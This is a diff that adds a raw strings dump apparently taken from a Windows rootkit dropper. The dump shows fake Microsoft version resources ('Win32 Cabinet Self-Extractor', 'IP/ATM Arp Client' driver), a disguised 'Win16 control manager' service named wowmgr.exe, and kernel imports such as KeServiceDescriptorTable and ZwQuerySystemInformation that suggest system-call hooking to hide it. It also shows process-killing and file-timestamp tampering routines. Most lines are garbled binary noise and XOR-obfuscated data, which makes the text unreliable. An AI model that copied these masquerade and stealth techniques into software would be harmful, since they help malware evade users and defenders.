@@ -1,0 +1,838 @@
+!This program cannot be run in DOS mode.
+RichU
+.text
+.data
+.rsrc
+SWj@3
+SVWj@3
+SPSSSSh
+PhhP@
+u}VWh
+Yt+Vj
+YY_^[
+Ph$Q@
+u:WSU
+ShtT@
+Pj,h@R@
+Ph@R@
+<h\T@
+PhPT@
+YhL_@
+SPWjsS
+VVPWjxS
+SVVPWjxS
+PhDU@
+WWWWW
+ShxU@
+Ph(W@
+PhHV@
+u)h`X@
+Ph|W@
+Sh`Y@
+D$DPh
+L$DQP
+Sh|X@
+tQCj"S
+ShhP@
+PVVVVV
+<3\t]VC
+ShPZ@
+PhdZ@
+>"u:F
+XPVSS
+lstrlenA
+CloseHandle
+DeviceIoControl
+CreateFileA
+DeleteFileA
+lstrcatA
+GetTempPathA
+GetEnvironmentVariableA
+GetWindowsDirectoryA
+CreateDirectoryA
+GetSystemDirectoryA
+GetLocalTime
+GetLastError
+SetFilePointer
+GetFileSize
+WriteFile
+OutputDebugStringA
+CopyFileA
+ReadFile
+SetFileTime
+GetFileTime
+GetVersionExA
+FreeLibrary
+Sleep
+lstrcmpiA
+GetProcAddress
+LoadLibraryA
+MoveFileA
+TerminateProcess
+OpenProcess
+GetModuleFileNameA
+CreateProcessA
+KERNEL32.dll
+RegDeleteKeyA
+RegCloseKey
+RegSetValueA
+RegCreateKeyA
+RegSetValueExA
+RegQueryValueExA
+RegEnumValueA
+CloseServiceHandle
+CreateServiceA
+OpenSCManagerA
+DeleteService
+ControlService
+StartServiceA
+OpenServiceA
+ADVAPI32.dll
+wsprintfA
+CharLowerBuffA
+USER32.dll
+memcmp
+memset
+??3@YAXPAX@Z
+strrchr
+strchr
+strstr
+__CxxFrameHandler
+memcpy
+??2@YAPAXI@Z
+_vsnprintf
+strlen
+_CxxThrowException
+strtok
+strcpy
+MSVCRT.dll
+__dllonexit
+_onexit
+??1type_info@@UAE@XZ
+_exit
+_XcptFilter
+_acmdln
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_except_handler3
+_controlfp
+GetModuleHandleA
+GetStartupInfoA
+%s\%s\%s
+%s\%s\%s.sys
+Service
+Driver
+SYSTEM\%s
+%s\%s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+APPDATA
+%s\1.txt
+%s\Temp
+%s\system32
+%windows%
+%system%
+%02d.%02d.%04d Log begin:
+%s\system32\winview.ocx
+Size of log(%dB) is too big, stop write.
+Log: Size of log(%dB) is too big, stop write.
+Log: Error(%d) get file size.
+Error in slprintf copy bytes
+%02d:%02d:%02d
+Log end.
+\win.com
+\system32\win.com
+FA.tmp
+''0;!
+:;!':9
+:;!':9
+0&: '60
+0&: '60:
+0&: '60
+</0:3
+0&: '60
+/nodel
+Exception in install.
+Only NT
+Win16 control manager
+Manage configuration of subsystem used to execute 16-bit applications
+wowmgr.exe
+%system%\wowmgr.exe /u
+Error
+\DRIVERS\
+File not installed because Win32s
+Uninstall
+atmarph
+%s : %d.%d Build: %d %s
+VER_PLATFORM_WIN32_WINDOWS
+VER_PLATFORM_WIN32_NT
+VER_PLATFORM_WIN32s
+CmdLine: %s.
+nolog
+FILES
+Kernel32.dll
+wowmgr
+WOWManager
+RegisterServiceProcess
+KERNEL32.DLL
+Create service ... OK.
+Description
+Error(%d) RegCreateKey %s.
+SYSTEM\CurrentControlSet\Services\%s
+Error(%d) create service.
+Service already exist.
+Error(%d) OpenSCManager.
+Try create service %s.
+Driver create %s ... OK.
+Error(%d) create Driver %s.
+Driver %s entry already exists.
+Error(%d) open SCManager.
+\drivers\
+Error(%d) uninstall driver %s.
+Driver %s successfully uninstalled.
+Error(%d) ControlService, Stop driver %s.
+Driver %s successfully stopped.
+Error(%d) StartService, driver %s.
+Driver %s successfully started.
+Unknown error %s driver %s.
+Error(%d) OpenService, %s driver %s.
+Error(%d) OpenSCManger %s driver %s.
+Start
+Exception in Uninstall.
+File %s not found.
+Move file %s to %s... %d, error(%d).
+\003fd-f0ff-5efe-0e348.tmp
+\Temp
+Error(%d) del %s.
+Del %s ... OK.
+Delete %s ... %d(error:%d).
+Diskstvw.vxd
+\iosubsys\
+Uninstall:
+%d.%d Build: %d %s
+Error(%d) GetVersionEx.
+Process %s not found.
+Terminate process %s ... OK.
+Error(%d) terminate process %s.
+Enum processes:
+Module32Next
+Module32First
+Process32Next
+Process32First
+CreateToolhelp32Snapshot
+Kernel32.DLL
+OS ver < 5, can't terminamte %s.
+Delete %s first time OK.
+File not found.
+Wait %d milliseconds.
+Error(%d) delete %s attempt N %d.
+Error(%d) CreateToolhelp32Snapshot %s.
+Exception in GetCmdLineValueByKey.
+windows
+system
+Error(%d) write file %s, %d/%d(B).
+Write file %s, %d(B) ... OK.
+Error(%d) create file %s.
+.?AVtype_info@@
+!This program cannot be run in DOS mode.
+.text
+h.data
+`.edata
+@INIT
+.rsrc
+B.reloc
+C:\proj\drivers\fa\sys\objfre\i386\wd.pdb
+VWh0>
+E9^8Wu
+VVVj@h
+|BWj?Y3
+trVj VVVj@h
+u#h8>
+SVj@h
+VWj@h
+8autj
+VWj@Y
+D$8PW
+YYtoWj@3
+YYj@3
+YYj@Y3
+E|_^[
+j@WSSS
+SShJ%
+t!97|
+VVVVh
+wXtN-
+F-$ "
+0UA;L$
+B@;D$
+VVj j
+VVj _Wj
+EH_^[
+VWj Yj@3
+VWj Yj@3
+f!ELj Y
+QQSUVW
+_^][YY
+ntoskrnl
+ntdll.dll
+YYt"h
+_root_
+ntoskrnl
+ZwQuerySystemInformation
+ZwQuerySystemInformation
+ZwQuerySystemInformation
+ZwQuerySystemInformation
+QQSVW
+0#<60dU
+<0-%9:'0'U
+,&!08
+&,&!08fg
+<0-%9:'0{0-0U
+0#<60&
+,&!08
+&,&!08fg
+1'<#0'&
+,&!08
+&,&!08fg
+<0-%9:'0{0-0U
+02<&!',
+46=<;0
+:3!"4'0
+<6':&:3!
+<;1:"&
+''0;!
+0'&<:;
+02<&!',
+46=<;0
+''0;!
+:;!':9
+:;!':9
+8420U
+XDK~u
+=XDK
+F t3f
+QQSVW
+t6Ht,Ht"Ht
+atmarpd.sys
+wcsnicmp
+j>Wh@K
+WSj"Sjd
+x4SVh
+ExAllocatePool
+ExFreePool
+RtlInitUnicodeString
+RtlAppendUnicodeStringToString
+ObfDereferenceObject
+KeWaitForSingleObject
+KeReleaseMutex
+ZwClose
+ZwDeleteValueKey
+ZwDeleteKey
+PsTerminateSystemThread
+wcslen
+strstr
+wcsstr
+strncpy
+wcscat
+wcscpy
+ZwQueryKey
+ZwOpenKey
+strchr
+RtlTimeToTimeFields
+ExSystemTimeToLocalTime
+KeQuerySystemTime
+IofCompleteRequest
+RtlDeleteRegistryValue
+RtlWriteRegistryValue
+RtlCreateRegistryKey
+ZwSetInformationFile
+ZwQueryInformationFile
+ZwCreateFile
+ZwWriteFile
+KeDelayExecutionThread
+KeInitializeMutex
+PsGetCurrentThreadId
+_stricmp
+RtlNtStatusToDosError
+ZwQuerySystemInformation
+IoFreeMdl
+MmUnlockPages
+MmMapLockedPages
+MmProbeAndLockPages
+IoAllocateMdl
+IoGetCurrentProcess
+RtlCompareUnicodeString
+strncmp
+KeServiceDescriptorTable
+ntoskrnl.exe
+KfReleaseSpinLock
+KfAcquireSpinLock
+HAL.dll
+IoDeleteDevice
+IoCreateSymbolicLink
+IoDeleteSymbolicLink
+IoRegisterShutdownNotification
+IoUnregisterShutdownNotification
+IoCreateDevice
+ZwReadFile
+ZwCreateKey
+memmove
+RtlCopyUnicodeString
+ZwQueryValueKey
+ZwEnumerateKey
+ZwEnumerateValueKey
+ZwSetValueKey
+ObReferenceObjectByHandle
+PsCreateSystemThread
+IoGetDeviceObjectPointer
+IofCallDriver
+IoBuildDeviceIoControlRequest
+KeInitializeEvent
+5 5$5(5,5054585P5T5X5\5`5d5h5l5p5t5x5|5
+6 6$6(6,6064686<6@6D6H6L6P6T6X6\6`6d6
+9.9J9R9W9c9m9|9
+:&:e:j:x:
+:N;U;g;{;
+; <7<A<F<\<r<
+<<=_=
+334|5w6
+8J8g8
+:M:W:
+?H?y?
+1<2I2\2l2
+3J3\3
+4+444D4g4r4
+6,6U6
+7&737@7S7
+:1;:;
+;$<L<d<
+=/=I=R=Z=f=n=u=
+>%>5>;>M>o>
+0B0O0f0
+1 1-141B1X1^1q1
+292F2_2
+2b3q3
+4-4<4V4f4l4
+5"6)6V6]6w6
+7H7g7|7
+;X=\=`=d=h=l=p=t=x=|=
+?"?'?,?8?=?B?
+60a0x0
+203f3
+7"7)70777B7o7
+;B<a<g<w<
+<1=j=o=
+>.><>J>g>t>
+3vu4j3Fw4
+wlDqet4
+7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5
+dn4|v
+Yf3{ J
+BI|oP4F7JyuU
+sjnbcwlDqet4F7Jy%
+i4!4Lm
+KupzxI6as8
+cmMel|54
+s5L^n4ri3dn
+L6gc923
+L34xrf5svd0dk6g1a0s
+1dI3uu4j7Fw
+rjnfcwlDqev4F7JyeUi$m5Im~xl!pzxI6ac80cbLnmz54c
+5gs923HL34x2f5cvd0f?
+c1i0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923H\3
+Acvd0
+k6c!a0s41dM7uu4j7Fw4sjnbcw,Dq
+ZP'C+yuUitm5I
+nxl#pzxq6as80cbLnmz54c35L
+Pdo5L&gs9
+3HL14x2,5cvd0fk6c1a0s
+4sJnbc
+lDqst4F{JyuUi4m5Imnxl10zx
+bLn}z54sr5Ldn4r
+3do5L6gs923HL3tx2
+5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI
+_?>q$
+/vMcF`8
+.+R"9
+}tBu_1pG
+]*}S4#0
+C/1X3a
+1!4zx
+){MY.S
+YN0'^
+LW/jgV@n
+qtq]Zs
+Hk.T6
+EDN+b
+ncL@!/
+aL&v7
+hN9$;YT
+A4-Id
+fzaAa
+|8z{)
+/~k[4
+]8p.V-}
+qqsze5.
+{1}kn<~zp(%
+2 XA[
+J8$uG
+Zi%%Zr
+/KVZ]
+VLQ[>F
+7,8qj{
+NiLf;
+Aq@r7S
+``{:e~E{
+<@Q+Qj[1
+;sIHM
++IA7a
+,Gw0cu
+wb[2k}
+z%Jb)
+}Q{#>
+PJ,!qV
+B}p$R
+ZfINc
+R9't%
+]PZ9\
+j/jju
+t:d_&
+9L76%
+7OC&p<
+LNjHt
+2+I&E
+Ud%+(Qw':
+9v3V^
+(5A9J
+A0 E{
+v}jMfJ
+(kt=QG$
+$zb9:/
+&<#~Di
+z~0#R
+9z?CR:g
+|48$$q
+Bo]xv
+L^qi(
+4}WhC0
+fu$adb[k
+<2x]U
+wi^pE
+5~vfMe
+"oq-Y
+UOAH[
+NQP"H#e?
+g![Qm
+.3-}cti
+twN^h
+rZ7Lvn
+2B[=(
+4-F2R3
+$>RG.
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyU
+t,ImE>
+2C#j?
+AU6_5
+ra,L~
+K%u"b
+JOC&hpi
+'>0Y(
+,SWo4>
+3j}BW
+<nRG!
+6JnAc
+E;Sb{o
+>XHe%
+CXu<AI
+X-ymh]
+ilz wa
+^p"t^
+vvBX-
++#jnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI7ac80czLn
+z54cs5Ldn4ri3dn5M6gs
+L34x2f5cvd0fk6b1x4s
+u5jSEw4sjnbcwlDqet4F7Jytwi4m5Imo
+z54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbL
+hs4s:
+x^_'/3b
+Kyu?m\m%Im
+rgv;Mdn^v
+*3f55
+?{54P
+kwlDqet4F
+@0ImE
+ZgLnn
+9as9$|
+wbs99
+W0j7E
+fEqew
+'hz54cs5
+Aw5L4=
+<pUik
+R~xIf2
+gbL>:
+o7uuma
+J7"yuUi
+K~xIg1
+a0x27e
+43Fwe#
+=m4mf
+huzx#
+m5cbLnmz54cs5Ldn_
+U2v0%Gd
+l1)(@
+<'u,f?z
+[8DKGR
+PVh \W
+T[4S#
+^Z*>RF
+yuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5svd0
+a0s"1d-
+i7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuU
+J1y54
+gn4#;
+~xl0ry|L0f{2<mrXvqZ
+3do5L6gs832IN16z1e6`r`4bn3f4a0s
+0eO1vv0n2Cq2tmfjj~fNznx8K:DwzZy$|$X|
+i} akiX'pa*"qp^|
+=LdncK#7
+)pzxb
+fk6f1`0s
+tL3uu
+rda5=
+NX1\7v
+%K<@:1
+DU+F.
+!23Hg
+a0s^j
+$setk
+amxlb
+O.;)o
+2cb1y
+Chn?m(
+\X5asi
+ek,4h
+WJL34K
+ggg0fhCkq
+i3do5
+YM2uuGy
+Zonxi1
+Aq%0-
+ln4rB
+TKs1uj
+Mwv%sf
+}Ui4F
+d1pzS
+DzPJG
+dD.;)
+a4m5Imnxl1pzxI6as80cbLnmz54cs5Ddn4
+923HL3_
+Zc1aw
+i4my&
+0was80cbLnmz54c
+ri3do5L6gs923Hh35xaf4cvd0fk6c1a0s
+dL3.u5j7Fw4sjnbcwlDMeu4%7KyuUi4m5Imnxl18zyI]ar80cbLnmz54cs5Ldn4ri3d
+F)DTA
+V_$LRP
+\PDJT
+lEqet4FHJxuUi4m<Im
+xH6as80cb;
+tLdnw
+PQVHL3k
+3&ukjaF24!j=b*w#D?e+4
+y3U&4m5Im
+pzyI6av80c
+Bnm{55cs5sdn4ri3dk5H6es923HL34x2f5cvd
+dk6b120
+uSjqF
+{uUh4]5}m^xU1@zLITaC80c.Lxm{5wc
+sT2VHL34x
+Edm36u[jEF
+4(7Jy!U
+z<ISa
+4ri3d85%6
+Hl3Wx]f[c
+uSjRF
+4sjPblwmD7e
+4*7/y#U
+zxI6aF8
+cRL^mT5
+cK5|d[4\i
+d_5|6Ws923Hz3?x3f|c
+uYjRFw4$j!b4w!D
+4'7-y
+4m5Im
+xE1qz4ISa
+5L6$sV2CH53Fx[fRc
+dDfK6K1"0Z
+uWjEF
+DQe74)78y
+UG4M5xmWxU1GzUI
+cRL@mz54cM5Gdo4=iAd
+sW2RH 3rx[fYc
+uYjPF
+Dqet427`ytU94
+Lnmz5yc
+2aHe3
+xef\c
+4!7jy&U
+1pz:I9ar8`c
+58d84
+sW23Hy3
+fS6S1T0]
+d}3Eu
+j7Fw47jnbbw:D
+4$5'm
+1pzxI
+aw80c6L
+5"6gs92:L
+74x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+3vu4j3Fw4
+wlDqet4
+7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5
+dn4|v
+Yf3{ J
+BI|oP4F7JyuUd
+L34x2f5cvd0fk6c11us
+}eL3gE
+)7Fw4sjnb
+wcEzdr4F5JyuUi4m5ImNhl1pjxI6As80c"Ln}z54as5Hdn4ri3dk5L6gs923hL34z2f5cvd2fk6c1q0s
+1dM3eu4z7Fw4sj~bcwlDqet4F7
+iuUA4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcglDQet4F7JyuUi4m5Imnxl1pzxI6as8
+bs5Ltn4rk3do7L6gs923HL34x2f
+0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqel%F7bhuU_%m5
+|nx4 pz
+X6ac)0cbLnm
+|'t/5
+RCc9Xs
+wog,D
+C}x,!{
+_D~-z
+t7t/5
+Y3$82
+hBl[S
+!$Mf#
+iuUi4m5Imnx
+pzxY6as80cbLnmz54cs5Ldn4ri+uo5d'gs
+"4xjw5c
+u0f{'c1a0s
+Dj-G0Q
+PG"s5Dg
+tL6Cr~WG
+04eE'"^
+Q2j%'19)
+BWZP*[JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
+1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI(
+33333330
+{{{{{{{3
+{{{{{{{33
+{{{{{{{330
+{{{{{{{330
+{{{{{{{330
+3333333
+33333333
+wwwwwwwwwww
+DDDDDD@
+DDDDDDGpw
+DDDDDDGpw
+DDDDDDDDDDD
+wwwwwwwwwww
+FILES
+VS_VERSION_INFO
+StringFileInfo
+040904b0
+CompanyName
+Microsoft Corporation
+FileDescription
+Win32 Cabinet Self-Extractor
+FileVersion
+4.72.2811.0
+InternalName
+Wextract
+LegalCopyright
+Copyright (C) Microsoft Corp. 1997-2000.
+OriginalFilename
+WEXTRACT.EXE
+ProductName
+Microsoft(R) Windows (R) Operating System
+ProductVersion
+4.72.2811.0
+VarFileInfo
+Translation
+Service
+sParam
+unParam
+nParam
+ntParam
+dParam
+Service
+\Device\
+\Registry\Machine\System\CurrentControlSet\Services
+\Registry\Machine\System\CurrentControlSet\Control
+\Registry\Machine\Software\Microsoft\Windows NT\CurrentVersion
+\REGISTRY\Machine\HARDWARE\DEVICEMAP
+\Registry\User
+Parameters
+\Parameters\psl
+\Parameters\psl
+\Registry\Machine\
+\Registry\Machine\
+Parameters
+\Parameters
+\Parameters
+\Parameters\psl
+\Parameters
+ImagePath
+VS_VERSION_INFO
+StringFileInfo
+040904b0
+Comments
+IP/ATM Arp Client
+CompanyName
+Microsoft Corporation
+FileDescription
+IP/ATM Arp Client
+FileVersion
+InternalName
+acpied.sys
+LegalCopyright
+Copyright (c) Microsoft Corp.1981-1999
+LegalTrademarks
+OriginalFilename
+acpied.sys
+PrivateBuild
+ProductName
+Microsoft(R) Windows (R) 2000 Operating System
+ProductVersion
+SpecialBuild
+VarFileInfo
+Translation
